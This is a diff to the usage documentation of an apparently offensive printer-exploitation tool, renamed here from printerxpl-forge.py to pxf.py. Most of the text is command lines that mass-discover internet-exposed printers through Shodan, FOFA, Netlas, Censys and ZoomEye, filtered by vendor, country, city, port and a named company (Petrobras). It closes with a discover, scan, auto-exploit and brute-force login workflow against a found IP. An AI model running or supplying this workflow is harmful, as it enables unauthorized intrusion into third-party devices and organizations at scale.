@@ -14,42 +14,42 @@
 
 ```bash
 # All Epson + Ricoh printers in Latin America with port 515 — all configured engines
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor epson --dork-vendor ricoh \
   --dork-region latin_america \
   --dork-port 515
 
 # HP DeskJet Pro 5500 in Brazil — Shodan + FOFA
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor hp \
   --dork-model "deskjet pro 5500" \
   --dork-country brazil \
   --dork-engine shodan,fofa
 
 # All printers in São Paulo with port 9100 — all engines
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-country BR \
   --dork-city "Sao Paulo" \
   --dork-port 9100
 
 # Kyocera printers in Europe, export up to 200 results — Netlas only
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor kyocera \
   --dork-engine netlas \
   --dork-region europe \
   --dork-limit 200
 
 # Ricoh printers in specific organization (ISP or company)
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor ricoh \
   --dork-org "Petrobras"
 
 # Brother printers by CPE on Censys (model-specific)
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-cpe "cpe:/h:brother:mfc-l8900cdw"
 
 # Multiple countries, multiple vendors, multiple ports
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor hp --dork-vendor canon \
   --dork-country BR --dork-country AR --dork-country CO \
   --dork-port 9100 --dork-port 631 \
@@ -95,14 +95,14 @@ At least one `--dork-*` filter must be provided. If none are given and no target
 
 ```bash
 # Use all configured engines (default)
-python printerxpl-forge.py --discover-online --dork-vendor hp --dork-country BR
+python pxf.py --discover-online --dork-vendor hp --dork-country BR
 
 # Use specific engines only
-python printerxpl-forge.py --discover-online --dork-vendor hp --dork-country BR \
+python pxf.py --discover-online --dork-vendor hp --dork-country BR \
   --dork-engine shodan,fofa,netlas
 
 # Single engine
-python printerxpl-forge.py --discover-online --dork-vendor epson --dork-port 9100 \
+python pxf.py --discover-online --dork-vendor epson --dork-port 9100 \
   --dork-engine zoomeye
 ```
 
@@ -132,7 +132,7 @@ Add to `config.json`:
 }
 ```
 
-Engines without valid credentials are silently skipped. Run `python printerxpl-forge.py --check-config` to see which engines are active.
+Engines without valid credentials are silently skipped. Run `python pxf.py --check-config` to see which engines are active.
 
 ---
 
@@ -228,7 +228,7 @@ Accepted names include: brasil, brazil, argentina, mexico, colombia, chile, peru
   Distribution: BR:41  AR:18  CO:9  MX:5
 
   [+] Results saved to .log/discovery_20260325_143022.json
-  [+] Next: python printerxpl-forge.py <IP> --scan
+  [+] Next: python pxf.py <IP> --scan
 ```
 
 ---
@@ -269,14 +269,14 @@ Combined example for `--dork-vendor hp --dork-country BR --dork-port 9100 --dork
 
 ```bash
 # 1. Discover
-python printerxpl-forge.py --discover-online --dork-vendor epson --dork-region latin_america
+python pxf.py --discover-online --dork-vendor epson --dork-region latin_america
 
 # 2. Scan individual result
-python printerxpl-forge.py 177.X.X.X --scan
+python pxf.py 177.X.X.X --scan
 
 # 3. Auto exploit
-python printerxpl-forge.py 177.X.X.X --auto-exploit
+python pxf.py 177.X.X.X --auto-exploit
 
 # 4. Brute-force login
-python printerxpl-forge.py 177.X.X.X --bruteforce --bf-vendor epson
+python pxf.py 177.X.X.X --bruteforce --bf-vendor epson
 ```
